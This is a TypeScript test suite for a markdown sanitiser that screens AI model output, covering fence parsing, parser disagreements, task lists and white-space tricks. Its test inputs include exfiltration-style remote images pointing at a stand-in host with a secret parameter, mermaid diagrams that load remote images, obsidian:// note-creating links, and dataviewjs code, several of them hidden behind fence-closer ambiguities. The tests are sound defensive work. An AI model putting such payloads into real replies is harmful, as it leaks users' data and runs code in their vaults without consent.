import { describe, expect, test } from "bun:test";
import { createScanBudget } from "../src/safety/scan";
import { fenceCloserDoubt, findLenientFenceCloser, scanFences } from "../src/safety/markdownFences";
import { sanitizeModelMarkdown, sanitizeModelMarkdownDetailed } from "../src/safety/sanitize";
import { prepareModelOutputForWrite } from "../src/safety/writePath";

const lines = (text: string): string[] => text.split("\n");
const spansOf = (text: string): Array<[number, number | null, number, boolean, number]> =>
	scanFences(lines(text)).map((span) => [span.openLine, span.closeLine, span.endLine, span.open, span.containerColumn]);

describe("scanFences: nested list items", () => {
	test("a fence indented to the outer item stays in the outer item after an inner item started", () => {
		// The inner "- " moved the old single-column tracker to column 4, so this fence looked like a top-level one.
		const text = "- outer\n  - inner\n  ```js\n  code\n  ```\n\nafter";
		expect(spansOf(text)).toEqual([[2, 4, 4, false, 2]]);
	});

	test("an unclosed fence in the outer item ends where the outer item ends, not at the inner column", () => {
		const text = "- outer\n  - inner\n  ```js\n  code\n\nplain";
		expect(spansOf(text)).toEqual([[2, null, 4, false, 2]]);
	});

	test("a fence indented into the inner item belongs to the inner item", () => {
		const text = "- outer\n  - inner\n    ```js\n    code\n    ```";
		expect(spansOf(text)).toEqual([[2, 4, 4, false, 4]]);
	});

	test("a marker at a shallower indent closes the items nested deeper", () => {
		const text = "- a\n  - b\n    - c\n- d\n  ```js\n  x\n  ```";
		expect(spansOf(text)).toEqual([[4, 6, 6, false, 2]]);
	});

	test("a flush-left fence after a list is top level", () => {
		const text = "- a\n  - b\n\n```js\nx\n```";
		expect(spansOf(text)).toEqual([[3, 5, 5, false, 0]]);
	});

	test("an over-indented line in an item stays code", () => {
		const text = "- a\n\n      ```js\n      not a fence\n";
		expect(spansOf(text)).toEqual([]);
	});

	test("five spaces after a list marker make what follows indented code, not a fence", () => {
		expect(spansOf("-      ```js\n       code")).toEqual([]);
		expect(spansOf("-    ```js\n     code")).toEqual([[0, null, 1, true, 5]]);
	});

	test("an item inside a quote ends with the quote", () => {
		// The list item is behind a quote marker, so the unquoted line below it is not indented into the item.
		expect(spansOf("> - item\n  ````js\n    `````\n````")).toEqual([[1, 3, 3, false, 0]]);
		expect(spansOf("> - item\n>   ```js\n>   x\n>   ```")).toEqual([[1, 3, 3, false, 2]]);
	});

	test("a lazy continuation line keeps the quote and its item open", () => {
		expect(spansOf("> - item\nlazy text\n> ```js\n> x\n> ```")).toEqual([[2, 4, 4, false, 0]]);
	});

	test("a lazy continuation line does not close the item", () => {
		const text = "- a\nlazy\n  ```js\n  x\n  ```";
		expect(spansOf(text)).toEqual([[2, 4, 4, false, 2]]);
	});
});

describe("findLenientFenceCloser", () => {
	const fence = { marker: "`" as const, length: 3, info: "", language: "", quoteDepth: 0, fenceIndent: 5, containerColumn: 5 };

	test("counts only lines with at most three columns of indentation, whichever way the parser measures it", () => {
		const text = ["x", "    ```", "   ```", "tail"];
		expect(findLenientFenceCloser(text, 0, fence)).toBe(2);
		expect(findLenientFenceCloser(["    ```", "     ```"], 0, fence)).toBe(2);
	});

	test("ignores lines that carry text after the fence characters and other fence characters", () => {
		expect(findLenientFenceCloser(["```js", "~~~", "````"], 0, fence)).toBe(2);
	});

	test("takes only a closer that every parser takes: a run and spaces, with no tab and no further fence characters", () => {
		// marked ends a fence at "```~" and not at "```" plus a tab; CommonMark the other way round. The later reading wins.
		expect(findLenientFenceCloser(["```\t", "```~", "``` \t", "```~`", "```  ", "tail"], 0, fence)).toBe(4);
		expect(findLenientFenceCloser(["```\t", "```~"], 0, fence)).toBe(2);
		expect(findLenientFenceCloser(["   ```   "], 0, fence)).toBe(0);
	});
});

describe("fenceCloserDoubt", () => {
	const doubtOf = (text: string, which = 0) => fenceCloserDoubt(lines(text), scanFences(lines(text))[which]);

	test("a plain closing line leaves no doubt, with or without trailing spaces or a longer run", () => {
		expect(doubtOf("```js\ncode\n```")).toBe("none");
		expect(doubtOf("```js\ncode\n```   ")).toBe("none");
		expect(doubtOf("```js\ncode\n`````")).toBe("none");
		expect(doubtOf("~~~\ncode\n~~~~")).toBe("none");
		expect(doubtOf("```js\ncode")).toBe("none");
	});

	test("lines that are no closer in any reading do not count: a shorter run, another character, an info string", () => {
		expect(doubtOf("````md\n```js\nx\n```\n````")).toBe("none");
		expect(doubtOf("```\n~~~\nx\n```")).toBe("none");
		expect(doubtOf("```\n```js\nx\n```")).toBe("none");
		expect(doubtOf("```\n``` text\nx\n```")).toBe("none");
	});

	test("a line that closes the fence only for a parser that takes more fence characters after the run is early", () => {
		expect(doubtOf("```js\ncode\n```~\nrest")).toBe("early");
		expect(doubtOf("~~~js\ncode\n~~~`\nrest")).toBe("early");
		expect(doubtOf("```js\ncode\n```~`\n```")).toBe("early");
		expect(doubtOf("```js\ncode\n```~ \nrest")).toBe("early");
	});

	test("an indented or quoted look-alike of a closer is early too, since parsers differ on how much of either a closer may carry", () => {
		expect(doubtOf("```js\n    ```\ntail\n```")).toBe("early");
		expect(doubtOf("```js\n\t```\ntail\n```")).toBe("early");
		expect(doubtOf("```js\n> ```\ntail\n```")).toBe("early");
	});

	test("a closing line with a tab after the run is late, and late wins over early", () => {
		expect(doubtOf("```js\ncode\n```\t")).toBe("late");
		expect(doubtOf("```js\ncode\n``` \t ")).toBe("late");
		expect(doubtOf("```js\n```~\n```\t")).toBe("late");
		expect(doubtOf("- ```js\n  code\n  ```\t")).toBe("late");
		expect(doubtOf("> ```js\n> code\n> ```\t")).toBe("late");
	});

	test("a tab inside the body or before the run does not count", () => {
		expect(doubtOf("```js\n\tcode\t\n```")).toBe("none");
		expect(doubtOf("- ```js\n  code\n\t```")).toBe("none");
	});

	test("with no work budget left the answer is late", () => {
		const text = "```js\na\nb\nc\n```";
		expect(fenceCloserDoubt(lines(text), scanFences(lines(text))[0], createScanBudget(1))).toBe("late");
		expect(fenceCloserDoubt(lines(text), scanFences(lines(text))[0], createScanBudget(1000))).toBe("none");
	});
});

describe("sanitizeModelMarkdown: closing lines that parsers read differently", () => {
	const image = "![x](https://evil.test/a.png?d=secret)";
	const remote = "[Remote image: x](https://evil.test/a.png?d=secret)";

	test("a closer followed by a mixed fence character no longer hides what follows", () => {
		// marked ends the fence at "```~", CommonMark keeps it open to the end.
		const backtick = sanitizeModelMarkdownDetailed(`\`\`\`js\ncode\n\`\`\`~\n\n${image}\n`);
		expect(backtick.text).toContain(remote);
		expect(backtick.findings.map((finding) => finding.kind)).toContain("remote-image");
		const tilde = sanitizeModelMarkdown("~~~js\ncode\n~~~`\n\n[x](obsidian://new?vault=v&name=n&content=c)\n");
		expect(tilde).not.toContain("](obsidian://");
		const dataview = sanitizeModelMarkdown("```js\ncode\n```~\n\n```dataviewjs\ndv.paragraph(app.vault.getName())\n```\n");
		expect(dataview).not.toMatch(/```dataviewjs/);
	});

	test("a closer followed by a tab no longer hides what follows", () => {
		// CommonMark closes the fence at "```\t", marked does not, so for marked the next "```" closes it and the image is text.
		const text = `\`\`\`js\ncode\n\`\`\`\t\n\`\`\`\n${image}`;
		expect(sanitizeModelMarkdown(text)).toEndWith(remote);
		expect(prepareModelOutputForWrite(text).findings.map((finding) => finding.kind)).toEqual(["remote-image"]);
	});

	test("a diagram closed by a tab line is judged together with what follows it", () => {
		const text = "```mermaid\nflowchart TD\n  A-->B\n```\t\nA@{ img: \"https://evil.test/x.png\" }\n```";
		const result = sanitizeModelMarkdownDetailed(text);
		expect(result.text.startsWith("```text\n")).toBe(true);
		expect(result.mermaid).toHaveLength(1);
		expect(result.mermaid[0]).toMatchObject({ downgraded: true, closed: true, source: "flowchart TD\n  A-->B" });
		expect(result.findings.map((finding) => finding.kind)).toEqual(["unsafe-diagram"]);
	});

	test("a diagram with an ordinary closer is not affected", () => {
		const text = "```mermaid\nflowchart TD\n  A-->B\n```\n\nSome text.\n";
		expect(sanitizeModelMarkdown(text)).toBe(text);
		expect(sanitizeModelMarkdown("```mermaid\nflowchart TD\n  A-->B\n```  \n\nSome text.\n")).toBe("```mermaid\nflowchart TD\n  A-->B\n```  \n\nSome text.\n");
	});

	test("the result is stable: a second pass changes nothing", () => {
		for (const text of [
			`\`\`\`js\ncode\n\`\`\`~\n\n${image}\n`,
			`~~~js\ncode\n~~~\`\n\n${image}\n`,
			`\`\`\`js\ncode\n\`\`\`\t\n\`\`\`\n${image}`,
			"```mermaid\nflowchart TD\n  A-->B\n```\t\nA@{ img: \"https://evil.test/x.png\" }\n```"
		]) {
			const once = sanitizeModelMarkdown(text);
			expect(sanitizeModelMarkdown(once)).toBe(once);
		}
	});

	test("code that ends in the ordinary way keeps its content, so does a closer with trailing spaces or a longer run", () => {
		for (const closer of ["```", "```   ", "````"]) {
			const text = `\`\`\`md\n${image}\n${closer}\n\n\`\`\`md\n${image}\n\`\`\`\n`;
			expect(sanitizeModelMarkdown(text)).toBe(text);
		}
	});

	test("a code example that shows a shorter fence, or a fence with an info string, inside a longer one is left alone", () => {
		const nested = `\`\`\`\`md\n\`\`\`js\n${image}\n\`\`\`\n\`\`\`\`\n\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(nested)).toBe(nested);
		// No parser closes the fence at "```js", so it is body text and the fence stays trusted.
		const labelled = `\`\`\`\n\`\`\`js\n${image}\n\`\`\`\n\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(labelled)).toBe(labelled);
	});
});

describe("sanitizeModelMarkdown: task list items", () => {
	test("a fence opener after a task checkbox is relabelled like any other opener", () => {
		const code = "  dv.paragraph(app.vault.getName())\n  ```\n";
		expect(sanitizeModelMarkdown(`- [ ] \`\`\`dataviewjs\n${code}`)).toBe(`- [ ] \`\`\`text\n${code}`);
		expect(sanitizeModelMarkdown(`- [x] \`\`\`dataviewjs\n${code}`)).toBe(`- [x] \`\`\`text\n${code}`);
		expect(sanitizeModelMarkdown(`1. [X] \`\`\`dataviewjs\n${code}`)).toBe(`1. [X] \`\`\`text\n${code}`);
		expect(sanitizeModelMarkdown(`> - [ ] \`\`\`dataviewjs\n> ${code}`)).toBe(`> - [ ] \`\`\`text\n> ${code}`);
		expect(sanitizeModelMarkdown(`* [/] ~~~dataviewjs\n${code}`)).toBe(`* [/] ~~~text\n${code}`);
		expect(sanitizeModelMarkdown(`-\t[ ]\t\`\`\`dataviewjs\n${code}`)).toBe(`-\t[ ]\t\`\`\`text\n${code}`);
		expect(sanitizeModelMarkdown(`- [ ] - [ ] \`\`\`dataviewjs\n${code}`)).toBe(`- [ ] - [ ] \`\`\`text\n${code}`);
	});

	test("a diagram opened after a task checkbox is judged", () => {
		const bad = "- [ ] ```mermaid\n  flowchart TD\n  A@{ img: \"https://evil.test/x.png\" }\n  ```\n";
		expect(sanitizeModelMarkdown(bad)).toStartWith("- [ ] ```text\n");
		// The scanner does not see this fence, so the diagram is judged as written, to the end of the reply: its own closing
		// line counts against it. A diagram in a task item is shown as code, which is the price of not guessing.
		const unseen = "- [ ] ```mermaid\n  flowchart TD\n  A-->B\n  ```\n";
		expect(sanitizeModelMarkdown(unseen)).toStartWith("- [ ] ```text\n");
		const listed = "- [ ] task\n\n  ```mermaid\n  flowchart TD\n  A-->B\n  ```\n";
		expect(sanitizeModelMarkdown(listed)).toBe(listed);
	});

	test("the sanitiser's finding for it carries the same identity as any plugin fence", () => {
		const result = sanitizeModelMarkdownDetailed("- [ ] ```dataviewjs\n  x\n  ```\n");
		expect(result.findings.map((finding) => finding.kind)).toEqual(["plugin-fence"]);
		expect(prepareModelOutputForWrite("- [ ] ```dataviewjs\n  x\n  ```\n").text).toStartWith("- [ ] ```text");
	});

	test("a fence the scanner cannot see leaves the fences after it unprotected", () => {
		const text = "- [ ] ```js\n  code\n  ```\n\n```md\n![x](https://evil.test/a.png?d=secret)\n```\n";
		expect(sanitizeModelMarkdown(text)).toContain("[Remote image: x]");
	});

	test("ordinary task items and inline code in them are left alone", () => {
		const text = "- [ ] write the report\n- [x] run ```npm install``` first\n- [ ] ```js inline``` text\n- [/] see [the docs](https://example.com)\n1. [ ] `code`\n";
		expect(sanitizeModelMarkdown(text)).toBe(text);
	});
});

describe("sanitizeModelMarkdown: which fences are copied through unread", () => {
	const image = "![x](https://evil.test/a.png?d=secret)";

	test("an indented opener with a closer at column zero no longer swaps which lines are code", () => {
		const text = ` \`\`\`js\nok\n\`\`\`\n\n${image}`;
		expect(sanitizeModelMarkdown(text)).toBe(` \`\`\`js\nok\n\`\`\`\n\n[Remote image: x](https://evil.test/a.png?d=secret)`);
		const written = prepareModelOutputForWrite(text);
		expect(written.findings.map((finding) => finding.kind)).toEqual(["remote-image"]);
		expect(written.text).toContain("[Remote image: x]");
	});

	test("an inline tag line does not swallow the fence opener that follows it", () => {
		const text = `<b>x</b>\n\`\`\`\n\n\`\`\`\n${image}`;
		expect(sanitizeModelMarkdown(text)).toEndWith("[Remote image: x](https://evil.test/a.png?d=secret)");
	});

	test("a fence after a blank line keeps its content, and so does one with three spaces of indent", () => {
		const text = `Intro\n\n   \`\`\`md\n${image}\n   \`\`\`\n\n~~~html\n<img src="https://example.com/a.png">\n~~~\n`;
		expect(sanitizeModelMarkdown(text)).toBe(text);
	});

	test("a fence flush with the margin ends a list item or a quote, so its code is left alone", () => {
		const list = `1. Step\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(list)).toBe(list);
		const quote = `> Quoted\n\`\`\`html\n<img src="https://example.com/a.png">\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(quote)).toBe(quote);
	});

	test("an indented fence in the same run of lines as a list item is relabelled but not trusted", () => {
		const text = `- Step\n \`\`\`dataviewjs\nx\n \`\`\`\n${image}`;
		const result = sanitizeModelMarkdown(text);
		expect(result).toContain(" ```text\nx\n ```");
		expect(result).toEndWith("[Remote image: x](https://evil.test/a.png?d=secret)");
		// The code inside is sanitised like the text around it, which costs a cosmetic change at most.
		const code = `- Step\n \`\`\`md\n${image}\n \`\`\``;
		expect(sanitizeModelMarkdown(code)).toBe(`- Step\n \`\`\`md\n[Remote image: x](https://evil.test/a.png?d=secret)\n \`\`\``);
	});

	test("a fence after an HTML line in the same run of lines is not trusted, even when flush with the margin", () => {
		const text = `<span>x</span>\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(text)).toContain("[Remote image: x]");
	});

	test("a fence whose quoted or listed neighbour was cut short by its container makes later fences untrusted", () => {
		const text = `- \`\`\`js\nx\n\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(text)).toContain("[Remote image: x]");
	});

	test("plain text hugging a nested fence's closer from outside makes later fences untrusted", () => {
		const hugged = `- item\n  \`\`\`js\n  x\n  \`\`\`\nplain\n\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(hugged)).toContain("[Remote image: x]");
		const separated = `- item\n  \`\`\`js\n  x\n  \`\`\`\n\nplain\n\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(separated)).toBe(separated);
		const nextItem = `- item\n  \`\`\`js\n  x\n  \`\`\`\n- next\n\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(nextItem)).toBe(nextItem);
	});

	test("a fence straight after a nested fence in the same run of lines is not trusted", () => {
		const text = `- item\n  \`\`\`js\n  x\n  \`\`\`\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(text)).toContain("[Remote image: x]");
	});

	test("an indented fence after a list is not trusted even across blank lines, but a flush-left one is", () => {
		const indented = `- item\n\n\n \`\`\`md\n${image}\n \`\`\`\n`;
		expect(sanitizeModelMarkdown(indented)).toContain("[Remote image: x]");
		const flush = `- item\n\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(flush)).toBe(flush);
		const settled = `- item\n\nParagraph.\n\n \`\`\`md\n${image}\n \`\`\`\n`;
		expect(sanitizeModelMarkdown(settled)).toBe(settled);
	});

	test("an HTML block that is still open at the fence means the fence is not copied through", () => {
		const text = `<div>\n\`\`\`md\n${image}\n\`\`\``;
		expect(sanitizeModelMarkdown(text)).toContain("[Remote image: x]");
	});

	test("a comment that starts inside a blank-terminated HTML block runs past its blank line", () => {
		const text = `<b>x</b>\n<!--\n\n\`\`\`md\n${image}\n\`\`\`\n-->\n<style>`;
		const result = sanitizeModelMarkdown(text);
		expect(result).toContain("[Remote image: x]");
		expect(result).toEndWith("&lt;style>");
	});

	test("frontmatter that a renderer might not recognise leaves the fences after it unprotected unless both readings agree", () => {
		const agreed = `---\ntitle: x\n---\n\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(agreed)).toBe(agreed);
		const disputed = `---\n\`\`\`\n---\n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(disputed)).toContain("[Remote image: x]");
	});

	test("a diagram in a list item is judged on its lines with the list's indentation removed and nothing else", () => {
		const nested = "- item\n\n  ```mermaid\n  flowchart TD\n    - A --> B\n  ```";
		expect(sanitizeModelMarkdown(nested)).toBe(nested);
		// "- flowchart TD" is the diagram's first line as the parser hands it over, so it is not a diagram header.
		const marker = "- item\n\n  ```mermaid\n  - flowchart TD\n    A --> B\n  ```";
		expect(sanitizeModelMarkdown(marker)).toContain("  ```text");
		const quoted = "> ```mermaid\n> flowchart TD\n>   A --> B\n> ```";
		expect(sanitizeModelMarkdown(quoted)).toBe(quoted);
	});
});

describe("sanitizeModelMarkdownDetailed: passes", () => {
	test("escaping the first line is not the end of it: the second pass reads the fence that line was hiding", () => {
		const text = "<img src=\"https://evil.test/x\">\n~~~\n\n~~~\n<img src=\"https://evil.test/y\">";
		const result = sanitizeModelMarkdownDetailed(text);
		expect(result.text).toBe("&lt;img src=\"https://evil.test/x\">\n~~~\n\n~~~\n&lt;img src=\"https://evil.test/y\">");
		expect(result.findings.map((finding) => finding.kind)).toEqual(["network-html", "network-html"]);
		expect(sanitizeModelMarkdown(result.text)).toBe(result.text);
	});

	test("findings and diagram reports from every pass are kept, each diagram once", () => {
		const text = "<b>x</b>\n<!--\n\n```mermaid\nflowchart TD\n  A@{ img: \"https://evil.test/x.png\" }\n```\n-->\n<style>";
		const result = sanitizeModelMarkdownDetailed(text);
		expect(result.mermaid.filter((report) => report.openLine === 3)).toHaveLength(1);
		expect(result.findings.map((finding) => finding.kind).sort()).toEqual(["network-html", "unsafe-diagram"]);
	});

	test("text that is already clean takes one pass and is returned as it was", () => {
		const text = "# Title\n\n```ts\nconst a = 1;\n```\n\n[link](https://example.com)";
		expect(sanitizeModelMarkdownDetailed(text)).toEqual({ text, findings: [], mermaid: [], budgetExhausted: false });
	});

	test("the strict pass reads every line as text, whatever the fences look like", () => {
		const text = "```md\n![x](https://evil.test/a.png)\n```\n\n`$= dv.current()`";
		const result = sanitizeModelMarkdownDetailed(text, { maxPasses: 0 });
		expect(result.text).toContain("[Remote image: x]");
		expect(result.text).toContain(`\`\u200B$= dv.current()\``);
	});

	test("a line with a tab and nothing else does not end a paragraph for code span pairing", () => {
		const image = "![x](https://evil.test/a.png)";
		// A parser that reads the tab line as text pairs the stray backtick with the first one below it.
		const tabbed = `stray \`\n\t\n\`${image}\``;
		expect(sanitizeModelMarkdown(tabbed)).toContain("[Remote image: x]");
		// A line of spaces is blank to every parser, so the span below stands alone and is left as written.
		const spaced = `stray \`\n  \n\`${image}\``;
		expect(sanitizeModelMarkdown(spaced)).toBe(spaced);
	});

	test("a granted exemption survives every pass and is not granted twice", () => {
		const source = "<style>.a { color: red }</style>";
		const text = `<b>x</b>\n<!--\n\n\`\`\`md\nx\n\`\`\`\n-->\n${source}\n${source}`;
		const written = prepareModelOutputForWrite(text, { sourceText: source });
		expect(written.text.match(/<style>/g)?.length).toBe(1);
		expect(written.text).toContain("&lt;style>");
	});
});

describe("sanitizeModelMarkdown: white space that CommonMark and marked do not count", () => {
	const image = "![x](https://evil.test/a.png?d=secret)";
	const remote = "[Remote image: x](https://evil.test/a.png?d=secret)";
	// JavaScript's trim and \s take these for white space. CommonMark and marked indent and blank a line with the space and
	// the tab only, and a regular expression `.` stops at the two separators, which are no line ending to either parser.
	const LEADS = ["\u00a0", "\u3000", "\u2003", "\u202f", "\u1680", "\u000b", "\u000c", "\ufeff"];
	const SEPARATORS = ["\u2028", "\u2029"];

	test("an opener led by such white space is text, so the image after it is still checked", () => {
		for (const lead of LEADS) {
			expect(sanitizeModelMarkdown(`${lead}\`\`\`js\n${image}\n`)).toContain(remote);
			const hidden = sanitizeModelMarkdown(`${lead}\`\`\`js\n\`\`\`dataviewjs\ndv.paragraph(app.vault.getName())\n\`\`\`\`\n`);
			expect(hidden).toContain("```text\n");
			expect(hidden).not.toContain("```dataviewjs");
		}
	});

	test("a closer led by such white space is code, so the fences after it are not read the wrong way round", () => {
		for (const lead of LEADS) {
			expect(sanitizeModelMarkdown(`\`\`\`js\ncode\n${lead}\`\`\`\ntext\n\`\`\`\n${image}\n`)).toContain(remote);
		}
	});

	test("a separator in the info string does not hide the opener from the scanner", () => {
		for (const separator of SEPARATORS) {
			expect(sanitizeModelMarkdown(`\`\`\`js${separator}x\ncode\n\`\`\`\n${image}\n`)).toContain(remote);
			expect(sanitizeModelMarkdown(`~~~${separator}\ncode\n~~~\n${image}\n`)).toContain(remote);
			const diagram = sanitizeModelMarkdownDetailed(`\`\`\`mermaid${separator}x\nflowchart TD\nA@{ img: "https://evil.test/x.png" }\n\`\`\`\n`);
			expect(diagram.findings.map((finding) => finding.kind)).toEqual(["unsafe-diagram"]);
			// A fence that is read, and read the way the parsers read it, keeps its code as written.
			const code = `\`\`\`md${separator}x\n${image}\n\`\`\`\n`;
			expect(sanitizeModelMarkdown(code)).toBe(code);
		}
	});

	test("the write path neutralises the same shapes", () => {
		for (const lead of LEADS.filter((char) => char !== "\ufeff")) {
			expect(prepareModelOutputForWrite(`${lead}\`\`\`js\n${image}\n`).text).toContain(remote);
			expect(prepareModelOutputForWrite(`\`\`\`js\ncode\n${lead}\`\`\`\ntext\n\`\`\`\n${image}\n`).text).toContain(remote);
		}
		for (const separator of SEPARATORS) {
			expect(prepareModelOutputForWrite(`\`\`\`js${separator}x\ncode\n\`\`\`\n${image}\n`).text).toContain(remote);
		}
	});

	test("a line of such white space is blank to marked, so nothing after it is copied through unread", () => {
		for (const lead of LEADS) {
			// marked lets the list item run on over the blank line and ends it at the quote; CommonMark ends it at the text line.
			const text = `* a\n\n${lead}\n   \`\`\`js\n> \`= this.file.name\`\n`;
			expect(sanitizeModelMarkdown(text)).toContain("`\u200b= this.file.name`");
			const nested = `* a\n  \`\`\`js\n  code\n${lead}\n  \`\`\`\n${image}\n`;
			expect(sanitizeModelMarkdown(nested)).toContain(remote);
		}
	});

	test("a line of spaces and tabs is blank to every parser and does not cost the fences after it their trust", () => {
		const text = `Intro\n \t \n\`\`\`md\n${image}\n\`\`\`\n`;
		expect(sanitizeModelMarkdown(text)).toBe(text);
	});

	test("a list item's fence that its container ends is checked up to a closer every parser takes", () => {
		// marked reads the "````` <tab>" line as code and carries the diagram on to the end; CommonMark closes at it.
		const text = '- \n  ````mermaid\n  flowchart TD\n ````` \t\nA@{ img: "https://evil.test/x.png" }\n';
		const result = sanitizeModelMarkdownDetailed(text);
		expect(result.text).toStartWith("- \n  ````text\n");
		expect(result.findings.map((finding) => finding.kind)).toEqual(["unsafe-diagram"]);
		expect(sanitizeModelMarkdown(result.text)).toBe(result.text);
		// With a closer both parsers take, the diagram ends there and is judged on its own.
		const plain = "- \n  ````mermaid\n  flowchart TD\n  A-->B\n `````\n\nafter\n";
		expect(sanitizeModelMarkdown(plain)).toBe(plain);
	});
});
